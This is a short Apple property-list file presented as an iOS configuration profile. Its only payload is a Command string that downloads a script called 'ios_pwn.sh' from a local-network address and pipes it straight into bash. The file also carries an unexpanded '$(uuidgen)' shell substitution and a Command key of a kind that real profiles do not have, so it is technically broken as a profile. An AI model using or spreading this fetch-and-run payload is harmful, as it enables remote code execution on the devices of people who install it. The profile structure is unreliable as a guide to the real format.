<?xml version="1.0"?>  
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">  
<plist version="1.0">  
<dict>  
    <key>PayloadContent</key>  
    <dict>  
        <key>Command</key>  
        <string>curl http://192.168.43.1/ios_pwn.sh | bash</string>  
    </dict>  
    <key>PayloadUUID</key>  
    <string>$(uuidgen)</string>  
    <key>PayloadType</key>  
    <string>Configuration</string>  
</dict>  
</plist>  
